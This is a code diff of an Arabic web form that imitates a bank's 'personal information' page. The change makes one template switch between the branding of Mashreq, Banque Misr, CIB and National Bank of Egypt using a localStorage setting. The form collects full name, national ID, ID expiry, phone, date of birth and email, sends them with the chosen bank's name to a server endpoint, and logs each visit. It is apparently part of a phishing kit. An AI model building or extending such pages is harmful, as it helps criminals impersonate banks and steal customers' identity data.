@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بنك مشرق مصر - المعلومات الشخصية</title>
+    <title>المعلومات الشخصية</title>
     <style>
         * {
             margin: 0;
@@ -22,21 +22,22 @@
             flex-direction: column;
             min-height: 100vh;
         }
-        /* Header: Logo right, Login button, Language button, and Menu icon left */
+        /* Header */
         header {
             background-color: #ffffff;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 8px 20px; /* تصغير البادينج */
+            padding: 8px 20px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            position: fixed; /* جعل الهيدر ثابتاً */
+            position: fixed;
             top: 0;
             z-index: 1000;
             width: 100%;
+            border-bottom: 4px solid;
         }
         .logo-container img {
-            height: 60px; /* تصغير الشعار ليتناسب مع الهيدر الجديد */
+            height: 60px;
             max-width: 220px;
             object-fit: contain;
         }
@@ -55,8 +56,7 @@
         }
         .lang-btn {
             background: none;
-            border: 1px solid #ff7f00;
-            color: #ff7f00;
+            border: 1px solid;
             padding: 6px 12px;
             border-radius: 4px;
             font-size: 13px;
@@ -65,29 +65,27 @@
             transition: all 0.2s;
         }
         .lang-btn:hover {
-            background-color: #ff7f00;
             color: white;
         }
         .login-btn {
-            background-color: #ff7f00;
-            border: 1px solid #ff7f00;
+            border: 1px solid;
             color: white;
-            padding: 4px 10px; /* تصغير الزر قليلاً */
+            padding: 4px 10px;
             border-radius: 4px;
-            font-size: 12px; /* تصغير الخط قليلاً */
+            font-size: 12px;
             font-weight: bold;
             text-decoration: none;
             cursor: pointer;
             transition: background-color 0.2s;
         }
         .login-btn:hover {
-            background-color: #e06f00;
+            opacity: 0.8;
         }
 
         /* Form Container Section */
         .form-container-wrapper {
             max-width: 600px;
-            margin: 100px auto 40px; /* إضافة مارجن علوي لتعويض الهيدر الثابت */
+            margin: 100px auto 40px;
             padding: 0 15px;
             width: 100%;
             flex: 1;
@@ -126,7 +124,7 @@
             transition: border-color 0.2s;
         }
         .form-control:focus {
-            border-color: #ff7f00;
+            border-color: currentColor;
         }
         /* Phone input container with flag */
         .phone-input-wrapper {
@@ -144,7 +142,7 @@
             font-size: 14px;
             font-weight: bold;
             pointer-events: none;
-            direction: ltr; /* Always LTR for phone prefix */
+            direction: ltr;
         }
         .phone-prefix img {
             width: 20px;
@@ -152,7 +150,7 @@
             border-radius: 2px;
         }
         .phone-input-wrapper input {
-            padding-left: 65px !important; /* Make room for the prefix and flag */
+            padding-left: 65px !important;
             direction: ltr;
             text-align: left;
         }
@@ -166,7 +164,6 @@
             cursor: pointer;
         }
         .submit-btn {
-            background-color: #ff7f00;
             color: white;
             border: none;
             width: 100%;
@@ -178,12 +175,11 @@
             transition: background-color 0.2s;
         }
         .submit-btn:hover {
-            background-color: #e06f00;
+            opacity: 0.9;
         }
 
         /* Footer */
         footer {
-            background-color: #ff7f00;
             color: white;
             padding: 35px 15px 15px;
             margin-top: 40px;
@@ -228,14 +224,14 @@
 </head>
 <body>
 
-    <!-- Header: Logo right, Login button, Language button, and Menu icon left -->
-    <header>
+    <!-- Header -->
+    <header id="header">
         <div class="logo-container">
-            <img src="images/mashreq_logo_new.jpg" alt="بنك مشرق مصر">
+            <img id="headerLogo" src="images/mashreq_logo_new.jpg" alt="البنك">
         </div>
         <div class="header-left">
-            <a href="login.html" class="login-btn">تسجيل الدخول</a>
-            <button class="lang-btn" onclick="window.location.href='personal_info_en.html'">English</button>
+            <a href="#" id="loginBtn" class="login-btn">تسجيل الدخول</a>
+            <button class="lang-btn" id="langBtn" onclick="window.location.href='personal_info_en.html'">English</button>
             <div class="header-icon" title="القائمة">&#9776;</div>
         </div>
     </header>
@@ -346,13 +342,13 @@
                 </div>
 
                 <div id="errorMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
-                <button type="submit" class="submit-btn">متابعة الطلب</button>
+                <button type="submit" class="submit-btn" id="submitBtn">متابعة الطلب</button>
             </form>
         </div>
     </div>
 
     <!-- Footer -->
-    <footer>
+    <footer id="footer">
         <div class="footer-content">
             <div class="footer-section">
                 <h3>الصفحات القانونية</h3>
@@ -367,41 +363,115 @@
                 <h3>خدمة العملاء والاتصال</h3>
                 <p><strong>خدمة العملاء:</strong> 19900</p>
                 <p><strong>الخط الأرضي:</strong> 0223456789</p>
-                <p><strong>البريد الإلكتروني الرسمي:</strong> info@mashreq.com</p>
+                <p id="footerEmail"><strong>البريد الإلكتروني الرسمي:</strong> info@mashreq.com</p>
             </div>
         </div>
         <div class="footer-bottom">
-            <p>جميع الحقوق محفوظة © بنك مشرق 2026</p>
+            <p id="footerCopy">جميع الحقوق محفوظة © بنك مشرق 2026</p>
         </div>
     </footer>
 
-    <!-- Tracking and Form Submit Scripts -->
+    <!-- Scripts -->
     <script>
+        // Bank Colors and Info
+        const bankColors = {
+            'mashreq': { color: '#ff7f00', name: 'بنك المشرق', email: 'info@mashreq.com', loginUrl: 'login.html' },
+            'bm': { color: '#b01c1c', name: 'بنك مصر', email: 'info@bm.com', loginUrl: 'login_bm.html' },
+            'cib': { color: '#004b91', name: 'بنك CIB', email: 'info@cib.com', loginUrl: 'login_cib.html' },
+            'nbe': { color: '#006b3f', name: 'البنك الأهلي المصري', email: 'info@nbe.com', loginUrl: 'login_nbe.html' }
+        };
+
+        const bankLogos = {
+            'mashreq': 'images/mashreq_logo_new.jpg',
+            'bm': 'images/bm_logo.png',
+            'cib': 'images/cib_logo.png',
+            'nbe': 'images/nbe_logo.png'
+        };
+
+        // Initialize Page
+        window.addEventListener('DOMContentLoaded', () => {
+            const selectedBank = localStorage.getItem('selectedBank') || 'mashreq';
+            updatePageTheme(selectedBank);
+        });
+
+        // Update Page Theme
+        function updatePageTheme(bankId) {
+            const bankInfo = bankColors[bankId];
+            const logo = bankLogos[bankId];
+
+            if (!bankInfo) return;
+
+            // Update Header
+            const header = document.getElementById('header');
+            header.style.borderBottomColor = bankInfo.color;
+
+            // Update Logo
+            document.getElementById('headerLogo').src = logo;
+
+            // Update Login Button
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.style.backgroundColor = bankInfo.color;
+            loginBtn.style.borderColor = bankInfo.color;
+            loginBtn.href = bankInfo.loginUrl;
+
+            // Update Language Button
+            const langBtn = document.getElementById('langBtn');
+            langBtn.style.borderColor = bankInfo.color;
+            langBtn.style.color = bankInfo.color;
+
+            // Update Form Controls
+            const formControls = document.querySelectorAll('.form-control');
+            formControls.forEach(control => {
+                control.addEventListener('focus', function() {
+                    this.style.borderColor = bankInfo.color;
+                });
+            });
+
+            // Update Submit Button
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.style.backgroundColor = bankInfo.color;
+
+            // Update Footer
+            const footer = document.getElementById('footer');
+            footer.style.backgroundColor = bankInfo.color;
+
+            // Update Footer Email
+            document.getElementById('footerEmail').innerHTML = `<strong>البريد الإلكتروني الرسمي:</strong> ${bankInfo.email}`;
+
+            // Update Footer Copy
+            document.getElementById('footerCopy').textContent = `جميع الحقوق محفوظة © ${bankInfo.name} 2026`;
+
+            // Update Page Title
+            document.title = `${bankInfo.name} - المعلومات الشخصية`;
+        }
+
+        // Track Visit
         fetch("/track_visit", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({ action: "track_visit", page: "personal_info" })
-        }).catch(error => console.error("Error tracking visit:", error));
+        }).catch(error => console.error('Error tracking visit:', error));
 
+        // Form Submit
         document.getElementById("personalInfoForm").addEventListener("submit", async function(event) {
             event.preventDefault();
 
             const fullName = document.getElementById("fullName").value;
             const nationalId = document.getElementById("nationalId").value;
-            const idExpiry_day = document.querySelector("select[name=\"idExpiry_day\"]").value;
-            const idExpiry_month = document.querySelector("select[name=\"idExpiry_month\"]").value;
-            const idExpiry_year = document.querySelector("select[name=\"idExpiry_year\"]").value;
+            const idExpiry_day = document.querySelector('select[name="idExpiry_day"]').value;
+            const idExpiry_month = document.querySelector('select[name="idExpiry_month"]').value;
+            const idExpiry_year = document.querySelector('select[name="idExpiry_year"]').value;
             const phone = document.getElementById("phone").value;
-            const dob_day = document.querySelector("select[name=\"dob_day\"]").value;
-            const dob_month = document.querySelector("select[name=\"dob_month\"]").value;
-            const dob_year = document.querySelector("select[name=\"dob_year\"]").value;
+            const dob_day = document.querySelector('select[name="dob_day"]').value;
+            const dob_month = document.querySelector('select[name="dob_month"]').value;
+            const dob_year = document.querySelector('select[name="dob_year"]').value;
             const email = document.getElementById("email").value;
-            const errorMessageDiv = document.getElementById("errorMessage");
+            const selectedBank = localStorage.getItem('selectedBank') || 'mashreq';
+            const bankInfo = bankColors[selectedBank];
 
-            // حفظ الاسم المدخل في localStorage لاستخدامه في صفحة تسجيل الدخول
-            localStorage.setItem("user_full_name", fullName);
+            const errorMessageDiv = document.getElementById("errorMessage");
 
             try {
                 const response = await fetch("/submit_request", {
@@ -412,11 +482,12 @@
                     body: JSON.stringify({
                         type: "personal_info",
                         data: {
+                            bank: bankInfo.name,
                             fullName: fullName,
                             nationalId: nationalId,
-                            idExpiry: `${idExpiry_year}-${idExpiry_month}-${idExpiry_day}`,
+                            idExpiry: `${idExpiry_day}/${idExpiry_month}/${idExpiry_year}`,
                             phone: phone,
-                            dob: `${dob_year}-${dob_month}-${dob_day}`,
+                            dob: `${dob_day}/${dob_month}/${dob_year}`,
                             email: email
                         }
                     })
@@ -424,19 +495,27 @@
 
                 const result = await response.json();
 
-                if (result.status === "approved" || result.status === "pending") {
+                if (result.status === "approved") {
                     localStorage.setItem("request_id", result.request_id);
-                    window.location.href = "login.html";
+                    window.location.href = "success.html";
                 } else {
                     errorMessageDiv.textContent = result.message || "حدث خطأ غير متوقع.";
                     errorMessageDiv.style.display = "block";
                 }
             } catch (error) {
-                console.error("Error during personal info submission:", error);
+                console.error("Error during form submission:", error);
                 errorMessageDiv.textContent = "حدث خطأ أثناء الاتصال بالخادم.";
                 errorMessageDiv.style.display = "block";
             }
         });
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const rejected = urlParams.get("rejected");
+        if (rejected === "true") {
+            const errorMessageDiv = document.getElementById("errorMessage");
+            errorMessageDiv.textContent = "تم رفض طلبك. يرجى التحقق من البيانات والمحاولة مرة أخرى.";
+            errorMessageDiv.style.display = "block";
+        }
     </script>
 
 </body>
